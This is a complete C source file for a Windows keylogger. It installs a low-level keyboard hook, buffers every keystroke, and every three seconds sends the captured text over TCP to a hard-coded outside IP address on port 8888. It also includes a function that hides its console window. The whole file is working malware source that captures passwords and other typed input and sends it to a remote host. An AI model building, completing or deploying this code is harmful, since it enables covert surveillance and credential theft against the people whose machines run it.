
#define WIN32_LEAN_AND_MEAN
//#define UNICODE
//#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <process.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "8888"

#define INVISIBLE
#define TIME_INTERVAL 3

static const struct {
    int key;
    const char* name;
} keyname[] = {
    {VK_BACK, "\b \b"},
    {VK_RETURN, "\n"},
    {VK_SPACE, " "},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[SHIFT]"},
    {VK_RSHIFT, "[SHIFT]"},
    {VK_CONTROL, "[CTRL+"},
    {VK_LCONTROL, "[CTRL+"},
    {VK_RCONTROL, "[CTRL+"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_CAPITAL, "[CAPSLOCK]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"}
};

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int thr = 1;
int ctrl = 0;
int shift = 0;

struct Node {
    char data;
    struct Node* next;
};
struct Node* head = NULL;

struct addrinfo* result = NULL,
    * ptr = NULL,
    hints;

LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    int i;
    int key_stroke;


    if (nCode >= 0)
    {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

        key_stroke = kbdStruct.vkCode;
        HWND foreground = GetForegroundWindow();
        DWORD threadID;
        HKL layout = NULL;

        if (foreground)
        {
            // get keyboard layout of the thread
            threadID = GetWindowThreadProcessId(foreground, NULL);
            layout = GetKeyboardLayout(threadID);
        }

        if (foreground)
        {
            char window_title[256];
            GetWindowTextA(foreground, (LPSTR)window_title, 256);
        }

        if (wParam == WM_KEYUP) {
            switch (key_stroke) {
            case VK_LCONTROL:
            case VK_RCONTROL:
                if (ctrl) {
                    //add list
                    struct Node* newNode = (struct Node*)malloc(sizeof(struct Node));
                    newNode->data = ']';
                    newNode->next = NULL;
                    if (head != NULL) {
                        struct Node* tmp = head;

                        while (tmp->next != NULL) {
                            tmp = tmp->next;
                        }
                        tmp->next = newNode;
                    }
                    else {
                        head = newNode;
                    }
                    ctrl = FALSE;
                }
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_SHIFT:
                if (shift) {
                    shift = FALSE;
                }
                break;
            }
        }

        if (wParam == WM_KEYDOWN) {
            switch (key_stroke) {
            case VK_LCONTROL:
            case VK_RCONTROL:
                if (!ctrl) {
                    ctrl = TRUE;
                }
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_SHIFT:
                if (!shift) {
                    shift = TRUE;
                }
                break;
            }

            if (ctrl && (key_stroke == 'Q')) {
                PostQuitMessage(0); // �޽��� ������ ���� �޽����� ����.
                thr = 0;
                return -1; // ��ŷ ü�ο� �޽��� ���޾���.
            }

            for (i = 0; i < sizeof(keyname) / sizeof(keyname[0]); i++)
            {
                if (keyname[i].key == key_stroke)
                {
                    //add list
                    int x = 0;
                    while (keyname[i].name[x] != 0) {
                        struct Node* newNode = (struct Node*)malloc(sizeof(struct Node));
                        newNode->data = keyname[i].name[x];
                        newNode->next = NULL;
                        if (head != NULL) {
                            struct Node* tmp = head;

                            while (tmp->next != NULL) {
                                tmp = tmp->next;
                            }
                            tmp->next = newNode;
                        }
                        else {
                            head = newNode;
                        }
                        x++;
                    }
                    break;
                }
            }

            if (i == sizeof(keyname) / sizeof(keyname[0]))
            {
                char key;
                key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

                if (shift && isdigit(key_stroke)) {
                    switch (key - 48) {
                    case 1:
                        key = '!';
                        break;
                    case 2:
                        key = '@';
                        break;
                    case 3:
                        key = '#';
                        break;
                    case 4:
                        key = '$';
                        break;
                    case 5:
                        key = '%';
                        break;
                    case 6:
                        key = '^';
                        break;
                    case 7:
                        key = '&';
                        break;
                    case 8:
                        key = '*';
                        break;
                    case 9:
                        key = '(';
                        break;
                    case 0:
                        key = ')';
                        break;
                    default: break;
                    }
                }
                else if (!isalpha(key_stroke) && shift)
                {
                    switch (key_stroke) {
                    case VK_OEM_PLUS:
                        key = '+';
                        break;
                    case VK_OEM_MINUS:
                        key = '_';
                        break;
                    case VK_OEM_PERIOD:
                        key = '>';
                        break;
                    case VK_OEM_2:
                        key = '?';
                        break;
                    case VK_OEM_COMMA:
                        key = '<';
                        break;
                    case VK_OEM_1:
                        key = ':';
                        break;
                    case VK_OEM_3:
                        key = '~';
                        break;
                    case VK_OEM_4:
                        key = '{';
                        break;
                    case VK_OEM_5:
                        key = '|';
                        break;
                    case VK_OEM_6:
                        key = '}';
                        break;
                    case VK_OEM_7:
                        key = '"';
                        break;
                    default:
                        break;
                    }
                }

                else {
                    int lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

                    // check shift key
                    if (shift) {
                        lowercase = !lowercase;
                    }

                    if (!lowercase) {
                        key = tolower(key);
                    }
                }

                //add list
                struct Node* newNode = (struct Node*)malloc(sizeof(struct Node));
                newNode->data = key;
                newNode->next = NULL;
                if (head != NULL) {
                    struct Node* tmp = head;

                    while (tmp->next != NULL) {
                        tmp = tmp->next;
                    }
                    tmp->next = newNode;
                }
                else {
                    head = newNode;
                }
            }
        }
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() //��ŷ�� �����Ͽ��� �� ����ڿ��� ���� �޽��� ǥ����.
{

    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

// TCP ���- connect, send, close
int SendtoServer(char* mes) {
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    SOCKET ConnectSocket = INVALID_SOCKET;

    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        int lastError = WSAGetLastError();
        printf("Connect failed with error: %d\n", lastError);
        return 1;
    }

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
    else
        printf("Client::Successful Connection!\n");

    iResult = send(ConnectSocket, mes, (int)strlen(mes), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        return 1;
    }

    closesocket(ConnectSocket);
    return 0;
}

// send_data()
void TcpSend() {
    time_t startTime, currentTime;
    struct Node* tmp = NULL;
    int ret;
    int lim_check;

    char output[DEFAULT_BUFLEN];
    int outputIndex = 0;

    //���� �ʱ�ȭ
    memset(output, 0, DEFAULT_BUFLEN);

    //���� �ð� ���
    time(&startTime);

    printf("Every %d second, the input is output.\n", TIME_INTERVAL);

    // run every 3 seconds (excluding code run time)
    // thr = for ending program via key input
    while (thr) {
        time(&currentTime);

        // hit every 3 seconds
        if (difftime(currentTime, startTime) >= TIME_INTERVAL) {

            if (head != NULL && outputIndex == 0) {
                tmp = head;

                while (tmp != NULL && outputIndex < DEFAULT_BUFLEN - 1) {
                    output[outputIndex] = tmp->data;
                    outputIndex++;
                    tmp = tmp->next;
                }

                lim_check = outputIndex;

                while (head != NULL && lim_check > 0) {
                    tmp = head;
                    head = head->next;
                    free(tmp);
                    lim_check--;
                }
            }

            if (outputIndex != 0) {
                ret = SendtoServer(output);
                if (!ret) {
                    memset(output, 0, DEFAULT_BUFLEN);
                    outputIndex = 0;
                }
            }
            time(&startTime);
        }
    }
    return 0;
}

unsigned __stdcall Key() {
    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ReleaseHook();
}

void Stealth()
{
#ifdef VISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef INVISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
int main() {
    //Stealth();

    WSADATA wsaData;
    int iResult;

    HANDLE keylogger = (HANDLE)_beginthreadex(NULL, 0, Key, NULL, 0, NULL);
    if (keylogger == 0) {
        printf("failed to make thread - keylogger\n");
        return 1;
    }

    // Winsock �ʱ�ȭ
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    // addrinfo ����ü �ʱ�ȭ
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo("182.210.200.238", DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    ptr = result;

    TcpSend();

    printf("\nConnection End.\n");
    freeaddrinfo(result); //�ּ� ���� ����.

    // cleanup
    WSACleanup();
    CloseHandle((HANDLE)keylogger);

    return 0;
}